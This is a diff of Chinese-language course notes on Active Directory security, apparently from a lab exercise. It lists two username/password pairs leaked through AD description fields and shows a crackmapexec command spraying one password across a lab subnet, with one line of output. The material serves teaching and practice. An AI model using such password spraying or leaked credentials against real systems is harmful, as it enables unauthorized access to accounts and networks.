@@ -91,8 +91,8 @@ Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGp
     **找出使用預設密碼(Changeme123!)的使用者找出使用(ncc1701)作為密碼的使用者**
 
     我先試著用前面提到的leak password from description中找到的兩組密碼實際測試看看
-    * 帳密一、Lina Allene→`r2NE4/9:F;[k`
-    * 帳密二、Fara Iseabal→`8F%kJ2q_cVFg`
+    * 帳密一、Lina Allene → `r2NE4/9:F;[k`
+    * 帳密二、Fara Iseabal → `8F%kJ2q_cVFg`
     ```bash
     $ crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p r2NE4/9:F\;\[k
     SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
